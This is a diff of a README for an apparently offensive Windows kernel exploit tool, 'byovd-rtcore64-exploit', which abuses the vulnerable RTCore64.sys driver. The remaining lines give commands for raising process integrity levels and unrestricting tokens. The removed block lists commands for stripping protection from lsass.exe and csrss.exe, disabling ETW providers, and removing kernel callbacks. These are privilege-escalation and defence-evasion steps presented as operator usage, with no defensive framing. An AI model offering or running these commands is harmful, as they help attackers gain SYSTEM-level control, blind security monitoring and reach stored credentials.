@@ -16,18 +16,6 @@ Capabilities not limited to elevating the target process' token similar to SYSTE
 * `byovd-rtcore64-exploit setintegritylevel 7957 TRUE`  
 * `byovd-rtcore64-exploit unrestricttoken 2543 TRUE`  
 
-// ====================== Ignore these for now ==================  
-* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe ppl FALSE`  
-* `byovd-rtcore64-exploit flipprocprotection <lsass|csrss>.exe pp TRUE`  
-* `byovd-rtcore64-exploit etwdisable providerListDisable.txt FALSE` ## the list.txt file contains the Providers after Post-Ex enum   
-* `byovd-rtcore64-exploit callback list object FALSE`  
-* `byovd-rtcore64-exploit callback list process FALSE`  
-* `byovd-rtcore64-exploit callback list thread FALSE`  
-* `byovd-rtcore64-exploit callback list registry FALSE`  
-* `byovd-rtcore64-exploit callback remove registry RTCore64.sys TRUE`  
-* `byovd-rtcore64-exploit callback remove thread RTCore64.sys TRUE`  
-// =================================================================  
-
 ## Example
 * `byovd-rtcore64-exploit`  
 
